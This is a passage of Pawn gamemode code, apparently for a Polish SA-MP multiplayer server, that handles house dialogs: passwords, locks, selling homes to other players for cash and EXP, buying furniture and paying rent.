			if(strcmp(HouseData[id][Password], inputtext))
				return ShowPlayerDialog(playerid, DIALOG_DOM_1, DIALOG_STYLE_INPUT, "Panel domu", ""C_BLUE1"Musisz "C_WHITE"podaæ has³o "C_BLUE1"aby wejœæ do domu\n\n"C_RED"Wprowadzone has³o jest nieprawid³owe.", "Dalej", "Anuluj");
			SendToHouse(playerid, id);
		}
		case DIALOG_DOM_2:
		{
			if(!response) return 1;

			new id = pData[playerid][InHouse];
			if(id == INVALID_HOUSE_ID) return SendClientMessage(playerid, RED, "Nie jesteœ w ¿adnym domu!");
			if(HouseData[id][pUID] != Player[playerid][ID]) return SendClientMessage(playerid, YELLOW, "Nie jesteœ w³aœcicielem tego domu.");

			if(listitem == 0) return ShowPlayerDialog(playerid, DIALOG_DOM_4, DIALOG_STYLE_INPUT, ""C_BLUE1"Has³o do domu", ""C_WHITE"Poni¿ej wpisz has³o, jakie bêdzie u¿ywane do wchodzenia do domu.\n{FF0000}Pamiêtaj, aby zapamiêtaæ swoje has³o!", "Ustaw", "Wróæ");
			if(listitem == 1) return ShowPlayerDialog(playerid, DIALOG_DOM_5, DIALOG_STYLE_LIST, ""C_BLUE1"Drzwi", ""C_GREEN"Otwarte\n"C_GREEN"Zabezpieczone has³em\n"C_GREEN"Tylko w³aœciciel", "Zmieñ", "Wróæ");

			if(listitem == 2) return ShowPlayerDialog(playerid, DIALOG_DOM_11, DIALOG_STYLE_LIST, ""C_ORANGE"Obiekty domowe", ""C_LOLIVE"Kup obiekt\n"C_BLUE1"Edytuj obiekt\n"C_BLUE1"Sprzedaj obiekt\n"C_BLUE1"Sprzedaj wszystkie obiekty", "Dalej", "Wróæ");

			if(listitem == 3)
			{
				foreach(Player, i)
				{
					if(i == playerid) continue;
					if(pData[i][InHouse] == id)
					{
						//SetPVarInt(i, "HousePickupCooldown", tickcount()+4000);
						SetPlayerPos(i, HouseData[id][houseX], HouseData[id][houseY], HouseData[id][houseZ]);
						SetPlayerVirtualWorld(i, 0);
						SetPlayerInterior(i, 0);
						pData[i][InHouse] = INVALID_HOUSE_ID;
						new msgstr[256];
						format(msgstr, sizeof(msgstr), "W³aœciciel domu %s wyrzuci³ wszystkich z domu.", HouseData[id][Owner]);
						SendClientMessage(i, GREEN, msgstr);
					}
				}
				SendClientMessage(playerid, GREEN, "Wyrzuci³eœ wszystkich graczy ze swojego domu.");

				return 1;
			}
			if(listitem == 4)
			{
				new bstrx[2048];
				format(bstrx, sizeof bstrx, "Sprzedaj dom innemu graczowi\nNatychmiastowa sprzeda¿");
				ShowPlayerDialog(playerid, DIALOG_SELL_HOUSE_XD, DIALOG_STYLE_LIST, ""C_RED"Sprzeda¿ domu", bstrx, "Dalej", "Anuluj");

				SetPVarInt(playerid, "HouseIDMenu", id);
				return 1;
			}
		}
		case DIALOG_SELL_HOUSE_XD:
		{
			new bstrx[512];
			if(!response) return 1;

			new id = GetPVarInt(playerid, "HouseIDMenu");
			switch(listitem)
			{
				case 0: ShowPlayerDialog(playerid, DIALOG_SELL_HOUSE_ID, DIALOG_STYLE_INPUT, ""C_YELLOW"Sprzeda¿ domu", ""C_BLUE1"> "C_WHITE"Podaj ID Gracza któremu chcesz sprzedaæ domek\n"C_BLUE1"> "C_WHITE"Gracz musi byæ w twoim domu", "Dalej", "Anuluj");

				case 1:
				{
					new d, h;
					timediff(HouseData[id][DomTime] - gettime(), d, h, h, h);
					new money = floatround(HouseData[id][Price] * 0.85);
					bstrx = "";

					format(bstrx, sizeof(bstrx), ""C_BLUE1"Czy na pewno chcesz sprzedaæ swój dom?\n"C_WHITE"Dostaniesz za niego "C_GREEN"%d$"C_WHITE".", money);

					ShowPlayerDialog(playerid, DIALOG_SELL_HOUSE, DIALOG_STYLE_MSGBOX, "Sprzeda¿ Domu", bstrx, "Tak", "Nie");

					return 1;
				}
			}
			return 1;
		}
		case DIALOG_SELL_HOUSE:
		{
			if(!response) return 0;
			new idx = pData[playerid][InHouse];
    		if(idx == INVALID_HOUSE_ID) return SendClientMessage(playerid, RED, "Wyst¹pi³ nieokreœlony b³¹d.");
			if(HouseData[idx][pUID] != Player[playerid][ID]) return SendClientMessage(playerid, RED, "Nie mo¿esz sprzedaæ domu nie nale¿¹cego do Ciebie.");

			new id = GetPVarInt(playerid, "HouseIDMenu");

			new d, h;
			timediff(HouseData[idx][DomTime] - gettime(), d, h, h, h);
    		new money = floatround(HouseData[id][Price] * 0.85);

    		Player[playerid][Cash] += money;
			ResetHouse(id);

			SetPlayerVirtualWorld(playerid, 0);
			SetPlayerInterior(playerid, 0);

			SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Dom sprzedany pomyœlnie.");
		}
		case DIALOG_SELL_HOUSE_ID:
		{
			new bstrx[512];
			if(!response) return 1;

			new gracz;
			if(sscanf(inputtext, "u", gracz))
			{
				ShowPlayerDialog(playerid, DIALOG_SELL_HOUSE_ID, DIALOG_STYLE_INPUT, "Sprzeda¿ domu", ""C_BLUE1"> "C_YELLOW"Podaj ID Gracza któremu chcesz sprzedaæ domek\n"C_BLUE1"> "C_WHITE"Gracz musi byæ w twoim domu", "Dalej", "Anuluj");

				SendClientMessage(playerid, RED, "B£AD: "C_WHITE"Musisz podaæ ID Gracza któremu chcesz sprzedaæ domek!");
				return 1;
			}

			if(!IsPlayerConnected(gracz))
			{
				ShowPlayerDialog(playerid, DIALOG_SELL_HOUSE_ID, DIALOG_STYLE_INPUT, "Sprzeda¿ domu", ""C_BLUE1"> "C_WHITE"Podaj ID Gracza któremu chcesz sprzedaæ domek\n"C_BLUE1"> "C_WHITE"Gracz musi byæ w twoim domu", "Dalej", "Anuluj");

				SendClientMessage(playerid, RED, "B£¥D: "C_WHITE"Ten gracz nie jest pod³¹czony!");
				return 1;
			}

			if(gracz == playerid)
			{
				ShowPlayerDialog(playerid, DIALOG_SELL_HOUSE_ID, DIALOG_STYLE_INPUT, "Sprzeda¿ domu", ""C_BLUE1"> "C_WHITE"Podaj ID Gracza któremu chcesz sprzedaæ domek\n"C_BLUE1"> "C_WHITE"Gracz musi byæ w twoim domu", "Dalej", "Anuluj");

				SendClientMessage(playerid, RED, "B£¥D: "C_WHITE"Nie mo¿esz sprzedaæ domu samemu sobie!");
				return 1;
			}

			if(PosiadaDomek(gracz) != -1)
			{
				ShowPlayerDialog(playerid, DIALOG_SELL_HOUSE_ID, DIALOG_STYLE_INPUT, "Sprzeda¿ domu", ""C_BLUE1"> "C_WHITE"Podaj ID Gracza któremu chcesz sprzedaæ domek\n"C_BLUE1"> "C_WHITE"Gracz musi byæ w twoim domu", "Dalej", "Anuluj");

				SendClientMessage(playerid, RED, "B£¥D: "C_WHITE"Ten gracz posiada ju¿ domek i nie mo¿esz mu go sprzedaæ!");
				return 1;
			}

			if(pData[gracz][InHouse] == INVALID_HOUSE_ID || pData[playerid][InHouse] == INVALID_HOUSE_ID || pData[gracz][InHouse] != pData[playerid][InHouse])
			{
				ShowPlayerDialog(playerid, DIALOG_SELL_HOUSE_ID, DIALOG_STYLE_INPUT, "Sprzeda¿ domu", ""C_BLUE1"> "C_WHITE"Podaj ID Gracza któremu chcesz sprzedaæ domek\n"C_BLUE1"> "C_WHITE"Gracz musi byæ w twoim domu", "Dalej", "Anuluj");

				SendClientMessage(playerid, RED, "B£¥D: "C_WHITE"Aby sprzedaæ graczowi dom musisz go do niego zaprosiæ!");
				return 1;
			}

			SetPVarInt(playerid, "SellHousePlayerID", gracz);

			bstrx = "";
			format(bstrx, sizeof bstrx, ""C_BLUE1"> "C_WHITE"Sprzeda¿ domu:\n"C_BLUE1"> "C_WHITE"Graczowi: %s (%d)\n"C_BLUE1"> "C_WHITE"Cena: BRAK\n\n\tPodaj Cenê w Dolarach:", Player[gracz][Name], gracz);
			ShowPlayerDialog(playerid, DIALOG_SELL_HOUSE_KASA, DIALOG_STYLE_INPUT, "Sprzeda¿ domu", bstrx, "Dalej", "Anuluj");

			return 1;
		}
		case DIALOG_SELL_HOUSE_KASA:
		{
			new bstrx[512];
			if(!response) return 1;

			new id = GetPVarInt(playerid, "HouseIDMenu");
			new kasa, gracz = GetPVarInt(playerid, "SellHousePlayerID");
			if(!IsPlayerConnected(gracz))
			{
				SendClientMessage(playerid, RED, "INFO: "C_WHITE"Gracz wyszed³ z serwera. Sprzeda¿ anulowana.");
				return 1;
			}

			if(sscanf(inputtext, "d", kasa))
			{
				bstrx = "";
				format(bstrx, sizeof bstrx, ""C_BLUE1"> "C_WHITE"Sprzeda¿ domu:\n"C_BLUE1"> "C_WHITE"Graczowi: %s [ID:%d]\n"C_BLUE1"> "C_WHITE"Cena: BRAK\n\n"C_WHITE"\tPodaj Cenê w Dolarach:", Player[gracz][Name], gracz);
				ShowPlayerDialog(playerid, DIALOG_SELL_HOUSE_KASA, DIALOG_STYLE_INPUT, "Sprzeda¿ domu", bstrx, "Dalej", "Anuluj");

				return 1;
			}

			new money = floatround(HouseData[id][Price] * 0.85) + 15000;
			if(kasa > money)
			{
				bstrx = "";
				format(bstrx, sizeof bstrx, ""C_BLUE1"> "C_WHITE"Sprzeda¿ domu:\n"C_BLUE1"> "C_WHITE"Graczowi: %s [ID:%d]\n"C_BLUE1"> "C_WHITE"Cena: BRAK\n\n"C_WHITE"\tPodaj Cenê w Dolarach:", Player[gracz][Name], gracz);
				ShowPlayerDialog(playerid, DIALOG_SELL_HOUSE_KASA, DIALOG_STYLE_INPUT, "Sprzeda¿ domu", bstrx, "Dalej", "Anuluj");
				new msgstr[256];
				format(msgstr, sizeof(msgstr), "B£¥D: "C_WHITE"Cena domu przekracza jego wartoœæ! Max "C_RED"%d$", money);
				SendClientMessage(playerid, RED, msgstr);
				return 1;
			}

			if(kasa < floatround(HouseData[id][Price] * 0.85))
			{
				bstrx = "";
				format(bstrx, sizeof bstrx, ""C_BLUE1"> "C_WHITE"Sprzeda¿ domu:\n"C_BLUE1"> "C_WHITE"Graczowi: %s [ID:%d]\n"C_BLUE1"> "C_WHITE"Cena: BRAK\n\n"C_WHITE"\tPodaj Cenê w Dolarach:", Player[gracz][Name], gracz);
				ShowPlayerDialog(playerid, DIALOG_SELL_HOUSE_KASA, DIALOG_STYLE_INPUT, "Sprzeda¿ domu", bstrx, "Dalej", "Anuluj");
				new msgstr[256];
				format(msgstr, sizeof(msgstr), "B£¥D: "C_WHITE"Cena domu jest za ma³a! Minimum "C_RED"%d$", floatround(HouseData[id][Price] * 0.85));
				SendClientMessage(playerid, RED, msgstr);
				return 1;
			}

			bstrx = "";
			format(bstrx, sizeof bstrx, ""C_BLUE1"> "C_WHITE"Sprzeda¿ domu:\n"C_BLUE1"> "C_WHITE"Graczowi: %s [ID:%d]\n"C_BLUE1"> "C_WHITE"Cena: %d$ + ? EXP\n\n"C_WHITE"\tPodaj Cenê w EXP:", Player[gracz][Name], gracz, kasa);
			ShowPlayerDialog(playerid, DIALOG_SELL_HOUSE_EXP, DIALOG_STYLE_INPUT, "Sprzeda¿ domu", bstrx, "Dalej", "Anuluj");

			SetPVarInt(playerid, "SellHouseMoney", kasa);

			return 1;
		}
		case DIALOG_SELL_HOUSE_EXP:
		{
			new bstrx[512];
			if(!response) return 1;

			new id = GetPVarInt(playerid, "HouseIDMenu");
			new exp, gracz = GetPVarInt(playerid, "SellHousePlayerID");
			new kasa = GetPVarInt(playerid, "SellHouseMoney");
			if(!IsPlayerConnected(gracz))
			{
				SendClientMessage(playerid, RED, "INFO: "C_WHITE"Gracz wyszed³ z serwera. Sprzeda¿ anulowana.");
				return 1;
			}

			new d, h;
			timediff(HouseData[id][DomTime] - gettime(), d, h, h, h);
			new gowno = floatround((d * HouseData[id][Czynsz]) * 0.85);
			new resp = RespektZMebli(id) + gowno + 1000;

			if(sscanf(inputtext, "d", exp))
			{
				bstrx = "";
				format(bstrx, sizeof bstrx, ""C_BLUE1"> "C_WHITE"Sprzeda¿ domu:\n"C_BLUE1"> "C_WHITE"Graczowi: %s [ID:%d]\n"C_BLUE1"> "C_WHITE"Cena: %d$ + ? EXP\n\n"C_WHITE"\tPodaj Cenê w EXP:", Player[gracz][Name], gracz, kasa);
				ShowPlayerDialog(playerid, DIALOG_SELL_HOUSE_EXP, DIALOG_STYLE_INPUT, "Sprzeda¿ domu", bstrx, "Dalej", "Anuluj");

				return 1;
			}

			if(exp > resp)
			{
				bstrx = "";
				format(bstrx, sizeof bstrx, ""C_BLUE1"> "C_WHITE"Sprzeda¿ domu:\n"C_BLUE1"> "C_WHITE"Graczowi: %s [ID:%d]\n"C_BLUE1"> "C_WHITE"Cena: %d$ + ? EXP\n\n"C_WHITE"\tPodaj Cenê w EXP:", Player[gracz][Name], gracz, kasa);
				ShowPlayerDialog(playerid, DIALOG_SELL_HOUSE_EXP, DIALOG_STYLE_INPUT, "Sprzeda¿ domu", bstrx, "Dalej", "Anuluj");

				new msgstr[256];
				format(msgstr, sizeof(msgstr), "B£¥D: "C_WHITE"Cena EXP domu przekracza jego wartoœæ! Max "C_RED"%d EXP", resp);
				SendClientMessage(playerid, RED, msgstr);
				return 1;
			}

			if(exp < (resp - 1000))
			{
				bstrx = "";
				format(bstrx, sizeof bstrx, ""C_BLUE1"> "C_WHITE"Sprzeda¿ domu:\n"C_BLUE1"> "C_WHITE"Graczowi: %s [ID:%d]\n"C_BLUE1"> "C_WHITE"Cena: %d$ + ? EXP\n\n"C_WHITE"\tPodaj Cenê w EXP:", Player[gracz][Name], gracz, kasa);
				ShowPlayerDialog(playerid, DIALOG_SELL_HOUSE_EXP, DIALOG_STYLE_INPUT, "Sprzeda¿ domu", bstrx, "Dalej", "Anuluj");
				new msgstr[256];
				format(msgstr, sizeof(msgstr), "B£¥D: "C_WHITE"Cena EXP domu jest zbyt ma³a! Minimum "C_RED"%d EXP", resp-100);
				SendClientMessage(playerid, RED, msgstr);
				return 1;
			}

			bstrx = "";
			format(bstrx, sizeof bstrx, ""C_BLUE1"> "C_WHITE"Sprzeda¿ domu:\n"C_BLUE1"> "C_WHITE"Graczowi: %s [ID:%d]\n"C_BLUE1"> "C_WHITE"Cena: %d$ + %d EXP\n\n"C_RED"> "C_WHITE"Czy Chcesz Wys³aæ Graczowi Ofertê Sprzeda¿y?", Player[gracz][Name], gracz, kasa, resp);
			ShowPlayerDialog(playerid, DIALOG_SELL_HOUSE_WYSLIJ_OFERTE, DIALOG_STYLE_MSGBOX, "Sprzeda¿ domu", bstrx, "TAK", "NIE");

			SetPVarInt(playerid, "SellHouseExp", exp);

			return 1;
		}
		case DIALOG_SELL_HOUSE_WYSLIJ_OFERTE:
		{
			new bstrx[512];
			if(!response) return 1;

			new exp = GetPVarInt(playerid, "SellHouseExp");
			new gracz = GetPVarInt(playerid, "SellHousePlayerID");
			new kasa = GetPVarInt(playerid, "SellHouseMoney");
			SetPVarInt(gracz, "SellHouseSprzedajacy", playerid);

			if(!IsPlayerConnected(gracz))
			{
				SendClientMessage(playerid, RED, "INFO: "C_WHITE"Gracz wyszed³ z serwera. Sprzeda¿ anulowana.");
				return 1;
			}
			new msgstr[256];
			format(msgstr, sizeof(msgstr), "Wys³a³eœ ofertê kupna twojego domu graczowi "C_YELLOW"%s [ID:%d]", Player[gracz][Name], gracz);
			SendClientMessage(playerid, GREEN, msgstr);
			format(msgstr, sizeof(msgstr), "Cena: {FFFF9F}%d$ "C_YELLOW"+ "C_BLUE1"%d EXP", kasa, exp);
			SendClientMessage(playerid, GREEN, msgstr);

			bstrx = "";
			strcat(bstrx, "\t"C_YELLOW"•• Oferta Kupna Domu ••\n\n");
			strcat(bstrx, splitf(""C_GREEN"Oferta od: {FFFF9F}%s [ID: %d]\n", Player[playerid][Name], playerid));
			strcat(bstrx, splitf(""C_GREEN"Cena: {FFFF9F}%d$ + %d EXP\n", kasa, exp));
			strcat(bstrx, ""C_LGREEN"Je¿eli chcesz kupiæ ten wpisz poni¿ej "C_WHITE"\"chce\"\n");
			strcat(bstrx, ""C_LGREEN"Je¿eli chcesz odrzuciæ propozycje wciœnij "C_WHITE"anuluj\n");

			ShowPlayerDialog(gracz, DIALOG_HOUSE_KUP_OD_GRACZA, DIALOG_STYLE_INPUT, "Oferta Kupna", bstrx, "Dalej", "Anuluj");

			return 1;
		}
		case DIALOG_HOUSE_KUP_OD_GRACZA:
		{

			new id = GetPVarInt(playerid, "SellHouseSprzedajacy");
			if(!IsPlayerConnected(id))
			{
				SendClientMessage(playerid, RED, "INFO: "C_WHITE"Gracz wyszed³ z serwera. Sprzeda¿ anulowana.");
				return 1;
			}

			if(!response)
			{
				OFERTA:
				new msgstr[256];
				format(msgstr, sizeof(msgstr), "INFO: "C_WHITE"Gracz "C_BLUE1"%s (%d) "C_WHITE"nie przyj¹³ twojej oferty sprzeda¿y domu!", Player[playerid][Name], playerid);
				SendClientMessage(id, RED, msgstr);
				SendClientMessage(playerid, YELLOW, "Odrzuci³eœ ofertê kupna domu od gracza.");

				SetPVarInt(id, "HouseIDMenu", INVALID_HOUSE_ID);
				SetPVarInt(id, "SellHouseExp", 0);
				SetPVarInt(id, "SellHouseMoney", 0);
				SetPVarInt(id, "SellHousePlayerID", -1);
				SetPVarInt(id, "SellHouseSprzedajacy", -1);

				return 1;
			}

			if(!strcmp(inputtext, "chce", true) || !strcmp(inputtext, "chcê", true))
			{
				new houseid = GetPVarInt(id, "HouseIDMenu");
				new exp = GetPVarInt(id, "SellHouseExp");
				new gracz = GetPVarInt(id, "SellHousePlayerID");
				new kasa = GetPVarInt(id, "SellHouseMoney");

				if(gracz != playerid) return 1;

				if(kasa > GetPlayerMoney(playerid))
				{
					new msgstr[256];
					format(msgstr, sizeof(msgstr), "INFO: "C_WHITE"Gracz "C_BLUE1"%s (%d) "C_WHITE"nie ma tyle pieniêdzy aby kupiæ twój dom.", Player[playerid][Name], playerid);
					SendClientMessage(playerid, RED, msgstr);
					SendClientMessage(playerid, RED, "INFO: "C_WHITE"Nie masz tyle kasy aby kupiæ dom!");

					SetPVarInt(id, "HouseIDMenu", INVALID_HOUSE_ID);
					SetPVarInt(id, "SellHouseExp", 0);
					SetPVarInt(id, "SellHouseMoney", 0);
					SetPVarInt(id, "SellHousePlayerID", -1);
					SetPVarInt(id, "SellHouseSprzedajacy", -1);

					return 1;
				}

				if(exp > Player[playerid][Exp])
				{
					new msgstr[256];
					format(msgstr, sizeof(msgstr), "INFO: "C_WHITE"Gracz "C_BLUE1"%s (%d) "C_WHITE"nie ma tyle EXP aby kupiæ twój dom.", Player[playerid][Name], playerid);
					SendClientMessage(id, RED, msgstr);
					SendClientMessage(playerid, RED, "INFO: "C_WHITE"Nie masz tyle EXP aby kupiæ dom!");

					SetPVarInt(id, "HouseIDMenu", INVALID_HOUSE_ID);
					SetPVarInt(id, "SellHouseExp", 0);
					SetPVarInt(id, "SellHouseMoney", 0);
					SetPVarInt(id, "SellHousePlayerID", -1);
					SetPVarInt(id, "SellHouseSprzedajacy", -1);

					return 1;
				}

				AddExp(id, exp);
				Player[id][Cash] += kasa;

				Player[playerid][Exp] -= exp;
				Player[playerid][Cash] -= kasa;

				HouseData[houseid][pUID] = Player[playerid][ID];
				format(HouseData[houseid][Owner], MAX_PLAYER_NAME, Player[playerid][Name]);

				SaveHouse(houseid);
				UpdateHouseLabel(houseid);
				new msgstr[256];
				format(msgstr, sizeof(msgstr), "Kupi³eœ dom od gracza "C_OLIVE"%s (%d)", Player[id][Name], id);
				SendClientMessage(playerid, YELLOW, msgstr);
				SendClientMessage(playerid, YELLOW, "Panel domu znajdziesz pod {FFFF9F}/dom");

				SendClientMessage(id, YELLOW, "Dom zosta³ sprzedany!");
				SetPlayerPos(id, HouseData[pData[playerid][InHouse]][houseX], HouseData[pData[playerid][InHouse]][houseY], HouseData[pData[playerid][InHouse]][houseZ]);
				SetPlayerVirtualWorld(id, 0);
				SetPlayerInterior(id, 0);
				pData[id][InHouse] = INVALID_HOUSE_ID;

				return 1;
			}
			else goto OFERTA;

			return 1;
		}
		case DIALOG_DOM_3:
		{
			if(!response) return ShowHouseMenu(playerid);
			if(SQLInjection(inputtext) == 1) return 0;

    		new id = pData[playerid][InHouse];
    		if(id == INVALID_HOUSE_ID) return DialogError(playerid, "{FFFF00}Nie jesteœ w swoim domu.");
			if(HouseData[id][pUID] != Player[playerid][ID]) return DialogError(playerid, "{FFFF00}Nie jesteœ w ¿adnym domu.");
			if(!(1 <= strlen(inputtext) <= MAX_HOUSE_NAME)) return ShowPlayerDialog(playerid, DIALOG_DOM_3, DIALOG_STYLE_INPUT, ""C_BLUE1"Nazwa domu", ""C_WHITE"Podaj nazwê domu", "Zmieñ", "Wróæ");
    		format(HouseData[id][hName], MAX_HOUSE_NAME, "%s", inputtext);

    		UpdateHouseLabel(id);
    		ShowHouseMenu(playerid);

    		SaveHouse(id);
    		return 1;
		}
		case DIALOG_DOM_4:
		{
			if(!response) return ShowHouseMenu(playerid);
			if(SQLInjection(inputtext) == 1) return 0;

    		new id = pData[playerid][InHouse];
    		if(id == INVALID_HOUSE_ID) return DialogError(playerid, "{FFFF00}Nie jesteœ w swoim domu.");
			if(HouseData[id][pUID] != Player[playerid][ID]) return DialogError(playerid, "{FFFF00}Nie jesteœ w ¿adnym domu.");
			if(!(1 <= strlen(inputtext) <= MAX_HOUSE_PASSWORD)) return ShowPlayerDialog(playerid, DIALOG_DOM_4, DIALOG_STYLE_INPUT, ""C_BLUE1"Has³o do domu", ""C_WHITE"Poni¿ej wpisz has³o, jakie bêdzie u¿ywane do wchodzenia do domu.\n{FF0000}Pamiêtaj, aby zapamiêtaæ swoje has³o!", "Ustaw", "Wróæ");

    		format(HouseData[id][Password], MAX_HOUSE_PASSWORD, "%s", inputtext);
    		ShowHouseMenu(playerid);

    		SaveHouse(id);
    		return 1;
		}
		case DIALOG_DOM_5:
		{
			if(!response) return ShowHouseMenu(playerid);

			new id = pData[playerid][InHouse];
    		if(id == INVALID_HOUSE_ID) return DialogError(playerid, "{FFFF00}Nie jesteœ w swoim domu.");
			if(HouseData[id][pUID] != Player[playerid][ID]) return DialogError(playerid, "{FFFF00}Nie jesteœ w ¿adnym domu.");

			HouseData[id][LockMode] = listitem;

			UpdateHouseLabel(id);
    		ShowHouseMenu(playerid);

    		SaveHouse(id);
    		return 1;
		}
		case DIALOG_DOM_11:
		{
    		if(!response) return ShowHouseMenu(playerid);

			new id = pData[playerid][InHouse];
    		if(id == INVALID_HOUSE_ID) return DialogError(playerid, "{FFFF00}Nie jesteœ w swoim domu.");
			if(HouseData[id][pUID] != Player[playerid][ID]) return DialogError(playerid, "{FFFF00}Nie jesteœ w ¿adnym domu.");

			if(listitem == 0)
			{
			    new bstrx[2048];
   				format(bstrx, sizeof(bstrx), "#\tNazwa\tCena\n");
	    		for(new i; i < sizeof(HouseFurnitures); ++i) format(bstrx, sizeof(bstrx), "%s%d\t%s\t%d EXP\n", bstrx, i+1, HouseFurnitures[i][Name], HouseFurnitures[i][Price]);

				ShowPlayerDialog(playerid, DIALOG_DOM_12, DIALOG_STYLE_TABLIST_HEADERS, ""C_BLUE1"Kupno Dodatków", bstrx, "Kup", "Wróæ");
			}

			if(listitem == 1)
			{
				SetPVarInt(playerid, "HouseSelectMode", SELECT_MODE_EDIT);
  				SelectObject(playerid);
    			SendClientMessage(playerid, -1, "Edycja obiektów rozpoczêta. Kliknij w obiekt, aby kontynuowaæ.");
			}

			if(listitem == 2)
			{
				SetPVarInt(playerid, "HouseSelectMode", SELECT_MODE_SELL);
  				SelectObject(playerid);
  				SendClientMessage(playerid, -1, "Kliknij na obiekt, który chcesz sprzedaæ.");
			}

			if(listitem == 3)
			{
 				new money, sold, data[e_furniture];
   				for(new i; i < Streamer_GetUpperBound(STREAMER_TYPE_OBJECT); ++i)
	    		{
     				if(!IsValidDynamicObject(i)) continue;
					Streamer_GetArrayData(STREAMER_TYPE_OBJECT, i, E_STREAMER_EXTRA_ID, data);
					if(data[SQLID] > 0 && data[HouseID] == id)
					{
			    		sold++;
			    		money += HouseFurnitures[data[ArrayID]][Price];
						DestroyDynamicObject(i);
					}
   				}

				new money2 = floatround(money * 0.85);

	 		   	SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Obiekty sprzedane.");
	 		   	AddExp(playerid, money2);
	 		   	m_query("DELETE FROM housefurnitures WHERE HouseID=%d", id);
			}
  			return 1;
		}
		case DIALOG_DOM_12:
		{
			if(!response) return ShowHouseMenu(playerid);

			new id = pData[playerid][InHouse], data[e_furniture];
    		if(id == INVALID_HOUSE_ID) return DialogError(playerid, "{FFFF00}Nie jesteœ w swoim domu.");
			if(HouseData[id][pUID] != Player[playerid][ID]) return DialogError(playerid, "{FFFF00}Nie jesteœ w ¿adnym domu.");

			if(HouseFurnitures[listitem][Price] > Player[playerid][Exp]) return SendClientMessage(playerid, RED, "Nie posiadasz wystarczaj¹cej iloœci EXP do kupna obiektu.");
			Player[playerid][Exp] -= HouseFurnitures[listitem][Price];

			SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Obiekt domowy zakupiony pomyœlnie.");

			new Float: x, Float: y, Float: z;
			GetPlayerPos(playerid, x, y, z);
 			GetXYInFrontOfPlayer(playerid, x, y, 3.0);
  			new objectid = CreateDynamicObject(HouseFurnitures[listitem][ModelID], x, y, z, 0.0, 0.0, 0.0, GetPlayerVirtualWorld(playerid), GetPlayerInterior(playerid));
			m_query("INSERT INTO housefurnitures SET HouseID=%d, FurnitureID=%d, FurnitureX=%f, FurnitureY=%f, FurnitureZ=%f, FurnitureVW=%d, FurnitureInt=%d", id, listitem, x, y, z, GetPlayerVirtualWorld(playerid), GetPlayerInterior(playerid));
 			mysql_store_result();
 			data[SQLID] = mysql_insert_id();
			data[HouseID] = id;
 			data[ArrayID] = listitem;
			data[furnitureX] = x;
			data[furnitureY] = y;
			data[furnitureZ] = z;
			data[furnitureRX] = 0.0;
			data[furnitureRY] = 0.0;
			data[furnitureRZ] = 0.0;
			mysql_free_result();
			Streamer_SetArrayData(STREAMER_TYPE_OBJECT, objectid, E_STREAMER_EXTRA_ID, data);
			EditDynamicObject(playerid, objectid);
			return 1;
		}
		case DIALOG_DOM_13:
		{
			if(!response) return 1;

			new id = pData[playerid][InHouse];
    		if(id == INVALID_HOUSE_ID) return DialogError(playerid, "{FFFF00}Nie jesteœ w swoim domu.");
			if(HouseData[id][pUID] != Player[playerid][ID]) return DialogError(playerid, "{FFFF00}Nie jesteœ w ¿adnym domu.");

			new objectid = GetPVarInt(playerid, "SelectedFurniture"), data[e_furniture];
			Streamer_GetArrayData(STREAMER_TYPE_OBJECT, objectid, E_STREAMER_EXTRA_ID, data);

			new money2 = floatround(HouseFurnitures[data[ArrayID]][Price] * 0.85);
			AddExp(playerid, money2);
			m_query("DELETE FROM housefurnitures WHERE ID=%d", data[SQLID]);

			SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Obiekt domowy usuniêty. Zwrócono {FF0000}85 "C_LOLIVE"procent wartoœci obiektu.");

			DestroyDynamicObject(objectid);
			DeletePVar(playerid, "SelectedFurniture");
			return 1;
		}
		case DIALOG_EXTENSION_HOUSE:
		{
			if(!response) return 0;
			new bstrx[2048];
			new idx = pData[playerid][InHouse];
    		if(idx == INVALID_HOUSE_ID) return DialogError(playerid, "{FFFF00}Nie jesteœ w swoim domu.");
			if(HouseData[idx][pUID] != Player[playerid][ID]) return DialogError(playerid, "{FFFF00}Nie jesteœ w ¿adnym domu.");

			new days = strval(inputtext);
			if((3 > days) || (days > 30)) return ShowPlayerDialog(playerid, DIALOG_EXTENSION_HOUSE, DIALOG_STYLE_INPUT, ""C_BLUE1"Op³acenie czynszu", ""C_BLUE1"Podaj iloœæ dni do sp³aty czynszu. ("C_WHITE"3-30"C_BLUE1")", "Dalej", "Zamknij");

			new houseid = GetPVarInt(playerid, "DomekDoPrzedluzenia");

			new score_ = (days * HouseData[houseid][Czynsz]);
			format(bstrx, sizeof(bstrx), ""C_LOLIVE"Dobowy czynsz: "C_WHITE"%d EXP\n"C_LOLIVE"%d dni * %d czynszu = %d EXP\n\n"C_BLUE1"Potwierdzasz op³atê czynszu?", HouseData[houseid][Czynsz], days, HouseData[houseid][Czynsz], score_);

			if(score_ > Player[playerid][Exp]) return DialogError(playerid, "{FFFF00}Nie staæ Ciê na op³atê czynszu na tyle dni.");

			SetPVarInt(playerid, "DomekLiczbaDni", days);
			ShowPlayerDialog(playerid, DIALOG_EXTENSION_HOUSE2, DIALOG_STYLE_MSGBOX, ""C_BLUE1"Op³acenie czynszu", bstrx, "Op³aæ", "Anuluj");

			return 1;
		}
		case DIALOG_EXTENSION_HOUSE2:
		{
			if(!response) return 0;
			new idx = pData[playerid][InHouse];
    		if(idx == INVALID_HOUSE_ID) return DialogError(playerid, "{FFFF00}Nie jesteœ w swoim domu.");
			if(HouseData[idx][pUID] != Player[playerid][ID]) return DialogError(playerid, "{FFFF00}Nie jesteœ w ¿adnym domu.");

    		new houseid = GetPVarInt(playerid, "DomekDoPrzedluzenia");
			new score_ = (GetPVarInt(playerid, "DomekLiczbaDni") * HouseData[houseid][Czynsz]);
			if(score_ > Player[playerid][Exp]) return DialogError(playerid, "{FFFF00}Nie staæ Ciê na op³atê czynszu na tyle dni.");

			OplacDom(houseid, GetPVarInt(playerid, "DomekLiczbaDni"));
			Player[playerid][Exp] -= score_;
			return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Czynsz op³acony pomyœlnie.");
		}
	}
	return 1;
}

CMD:vip(playerid, params[])
{
	new tstr[1024];
	format(tstr, sizeof(tstr), ""C_YELLOW"Posiadaj¹c aktywne uprawnienia VIP zyskujesz dodatkowe korzyœci:\n\n");
	format(tstr, sizeof(tstr), "%s"C_YELLOW"- "C_WHITE"Szybsze oraz darmowe kupno ¿ycia i kamizelki,\n", tstr);
